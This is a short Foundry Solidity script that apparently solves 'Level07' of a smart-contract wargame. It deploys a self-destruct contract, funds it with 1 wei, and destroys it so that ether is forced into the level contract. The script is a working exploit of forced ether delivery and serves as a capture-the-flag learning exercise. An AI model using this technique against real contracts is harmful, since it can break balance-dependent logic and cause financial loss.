// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Level07.sol";
import "../src/AttackerSelfDestruct.sol";

contract AttackerScript is Script {
    Level07 level07 = Level07(0xF3c3Ca4368b9eA33031Fe8aB80b2D93d4Bdde39d);

    function run() public {
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      //Input your level instance
      SelfDestruct attacker = new SelfDestruct();
      (bool success, ) = address(attacker).call{value: 1 wei}("");
      require(success);
      attacker.selfDestruct(payable(address(level07)));
      vm.stopBroadcast();
    }
}
